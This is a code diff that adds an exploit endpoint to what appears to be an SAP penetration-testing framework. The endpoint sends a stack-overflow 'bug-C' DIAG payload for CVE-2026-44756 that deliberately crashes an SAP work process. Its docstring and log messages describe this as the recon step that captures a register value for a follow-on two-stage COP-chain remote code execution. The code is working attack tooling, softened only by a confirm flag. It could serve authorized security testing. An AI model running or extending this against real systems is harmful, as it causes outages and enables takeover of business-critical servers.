@@ -8184,6 +8184,113 @@ def create_app(api: SAPMAPApi) -> Bottle:
              "CVE-2026-44756 DIAG RCE", _run)
         return json.dumps({"status": "started"})
 
+    @app.route("/api/node/<sid>/exploit_cve_2026_44756_diag_crash_probe",
+                method="POST")
+    def node_exploit_cve_2026_44756_diag_crash_probe(sid):
+        """Crash-only DIAG probe — used to unblock the rdx-capture
+        catch-22.  Sends a bug-C passport with a deliberately-bad
+        saved RIP (0x4142434445) over the DIAG dispatcher.  One work
+        process crashes; SAP re-forks it; the operator's find_rdx.py
+        helper on the target catches the SIGSEGV and dumps rdx.
+
+        This is a NECESSARY step before the DIAG RCE handler can run,
+        because rdx is per-instance and can't be derived remotely
+        without a live ptrace attach.  Once find_rdx.py has printed
+        the rdx value, paste it into the RCE dialog.
+
+        DESTRUCTIVE: kills one work process.  SAP auto-restarts it
+        within seconds.  Requires confirm=true."""
+        response.content_type = "application/json"
+        data = request.json or {}
+        if not data.get("confirm"):
+            return json.dumps({"error":
+                "confirm=true required — this crashes one SAP work "
+                "process on the target.  Do NOT run on production."})
+
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+
+        # DIAG port pick — same as the RCE handler.
+        diag_port = int(data.get("diag_port") or 0)
+        if diag_port <= 0:
+            for inst in getattr(node, "instances", []) or []:
+                ports = getattr(inst, "ports", {}) or {}
+                for p, lbl in ports.items():
+                    try:
+                        p_int = int(p)
+                    except (TypeError, ValueError):
+                        continue
+                    if lbl == "dispatcher" or 3200 <= p_int <= 3299:
+                        diag_port = p_int
+                        break
+                if diag_port > 0:
+                    break
+            if diag_port <= 0:
+                diag_port = 3200
+
+        def _run():
+            from sap_cve_2026_44756_diag import (
+                trigger_diag_crash_probe, CRASH_RIP)
+            print(f"[!] {sid}: CVE-2026-44756 DIAG crash-only probe "
+                  f"— target dispatcher {node.ip}:{diag_port}")
+            print(f"[!] {sid}: sending bug-C payload with saved RIP "
+                  f"= {CRASH_RIP:#x} (deliberately non-canonical — "
+                  f"guaranteed SIGSEGV, no code execution)")
+            print(f"[*] {sid}: BEFORE clicking Send, make sure "
+                  f"tools/cve-2026-44756/find_rdx.py is running on "
+                  f"the target as <sid>adm ('python3 find_rdx.py "
+                  f"{sid.upper()}') — it will catch the crash and "
+                  f"print the rdx value you paste into the DIAG RCE "
+                  f"prompt.")
+            res = trigger_diag_crash_probe(node.ip, diag_port)
+            print(f"[*] {sid}: wire delivered={res['delivered']} "
+                  f"dropped={res['connection_dropped']} "
+                  f"resp_bytes={res['response_bytes']} "
+                  f"payload_bytes={res['passport_len']}")
+
+            if res["delivered"] and res["connection_dropped"] \
+                    and not res["response_bytes"]:
+                # Same wire signature as the HTTP DoS — no reply
+                # means the WP took the hijack and died before
+                # sending anything back.
+                node.cve_2026_44756_dos_confirmed = True
+                node.cve_2026_44756_vulnerable = True
+                if node.cve_2026_44756_evidence != "diag_rce_signature":
+                    node.cve_2026_44756_evidence = "diag_crash_confirmed"
+                print(f"[!!] {sid}: DIAG crash CONFIRMED — one work "
+                      f"process took the hijack and died.  Check "
+                      f"find_rdx.py output on the target for the "
+                      f"FIND_RDX_OK:pid=… rdx=0x… line, then paste "
+                      f"the rdx value into the 'Trigger CVE-2026-"
+                      f"44756 DIAG RCE' dialog.")
+                sapmap_findings.emit_finding(
+                    "CRITICAL", sid,
+                    f"CVE-2026-44756 (OVERPASS) DIAG crash-probe "
+                    f"CONFIRMED on {node.ip}:{diag_port} — bug-C "
+                    f"stack overflow crashed one work process on "
+                    f"kernel {node.kernel}.  The two-stage COP-chain "
+                    f"RCE is one recon step away (capture rdx via "
+                    f"tools/cve-2026-44756/find_rdx.py, then run "
+                    f"the DIAG RCE action).",
+                    cve="CVE-2026-44756",
+                    ref="cve_2026_44756.diag_crash",
+                    attack_capability="exploit.cve_2026_44756")
+            else:
+                print(f"[?] {sid}: DIAG crash did NOT match the "
+                      f"expected signature.  Possible reasons: "
+                      f"(a) kernel actually patched (7.93 ≥PL412 / "
+                      f"9.16 ≥PL100 / 9.18 ≥PL032 / 9.19 ≥PL017 / "
+                      f"9.20 ≥PL007), (b) DIAG port blocked, "
+                      f"(c) exploit item scrubbed upstream.")
+                if res.get("response_preview_hex"):
+                    print(f"[?] {sid}: reply preview: "
+                          f"{res['response_preview_hex']}")
+
+        _bg(f"{sid}:diag_crash_cve_44756",
+             "CVE-2026-44756 DIAG crash probe", _run)
+        return json.dumps({"status": "started"})
+
     @app.route("/api/node/<sid>/exploit_cve_2026_44756_capture_bases",
                 method="POST")
     def node_exploit_cve_2026_44756_capture_bases(sid):
